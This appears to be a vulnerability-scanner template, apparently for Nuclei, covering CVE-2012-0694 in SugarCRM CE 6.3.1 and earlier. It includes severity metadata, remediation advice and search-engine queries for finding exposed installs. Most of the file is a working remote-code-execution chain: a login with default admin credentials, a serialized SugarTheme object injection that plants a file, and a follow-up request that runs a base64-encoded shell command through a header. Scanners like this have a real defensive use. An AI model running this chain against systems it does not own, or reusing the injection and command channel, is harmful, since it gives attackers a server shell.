id: CVE-2012-0694

info:
  name: SugarCRM CE <= 6.3.1 Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: SugarCRM CE <= 6.3.1 contains scripts that use "unserialize()" with user controlled input which allows remote attackers to execute arbitrary PHP code.
  impact: |
    Successful exploitation could lead to unauthorized remote code execution on the server.
  remediation: |
    Upgrade SugarCRM CE to version 6.3.2 or later to mitigate CVE-2012-0694.
  reference:
    - https://www.exploit-db.com/exploits/19381
    - https://seclists.org/bugtraq/2012/Jun/165
    - https://security-tracker.debian.org/tracker/CVE-2012-0694
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2012-0694
    cwe-id: CWE-20
    epss-score: 0.90833
    epss-percentile: 0.98978
    cpe: cpe:2.3:a:sugarcrm:sugarcrm:*:*:*:*:community:*:*:*
  metadata:
    vendor: sugarcrm
    product: sugarcrm
    shodan-query: http.title:sugarcrm
    fofa-query:
      - body="sugarcrm inc. all rights reserved"
      - title="sugar setup wizard"
      - title=sugarcrm
    google-query:
      - intext:"sugarcrm inc. all rights reserved"
      - intitle:"sugar setup wizard"
      - intitle:sugarcrm
  tags: seclists

http:
  - method: POST
    path:
      - "{{BaseURL}}index.php"

    body: |
      module=Users&action=Authenticate&user_name=admin&user_password=admin

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "action=Login"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}index.php"

    body: |
      module=Contacts&Contacts2_CONTACT_offset=1&current_query_by_page={{base64('{{serialize(new SugarTheme)}}')}}

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Set-Cookie: "
        part: header

  - method: GET
    path:
      - "{{BaseURL}}pathCache.php"

    headers:
      Cmd: "{{base64('whoami')}}"
    matchers:
      - type: word
        words:
          - "www-data"
        part: body
